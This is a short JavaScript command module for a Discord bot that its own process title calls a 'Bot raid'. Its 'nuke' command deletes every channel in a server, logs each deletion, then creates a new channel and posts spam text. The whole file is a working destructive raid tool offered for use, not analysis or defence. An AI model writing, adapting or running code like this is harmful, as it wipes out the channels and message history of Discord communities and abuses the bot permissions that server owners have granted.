const config = require("../config.json")
const Discord = require("discord.js")
const client = new Discord.Client()

const channelCreate = config.channelCreate
const spam = config.spamChannel

module.exports = {
  name: 'nuke',
  description: 'nuke all channels!',
  execute(message, args) {

  process.title = `Mass delete channels | Bot raid created by yiko `

    message.guild.channels.cache.forEach( c => c.delete().then( () => {
      console.log(`[CONSOLE]: Canal eliminado exitosamente ${c.name} | Id del canal ${c.id}`)
    }))

      message.guild.channels.create(channelCreate).then( channel  => channel.send(spam))


  }
};